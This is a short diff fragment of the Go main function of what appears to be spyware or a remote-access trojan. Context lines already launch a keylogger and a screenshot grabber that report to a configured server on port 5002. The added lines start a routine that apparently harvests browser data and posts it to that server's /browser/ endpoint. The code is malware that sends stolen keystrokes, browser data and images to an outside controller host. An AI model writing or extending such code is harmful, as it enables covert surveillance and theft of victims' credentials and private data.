@@ -85,6 +85,9 @@ func main() {
 		}
 		//go tunnel.Tunnel(addr)
 		go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
+	} else if lib.FileExits(lib.BrowserSafepath) != nil {
+		finflag := make(chan string)
+		go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
 	}
 	go killit.Killit()
 	go killit.GetPic(conf.Url)
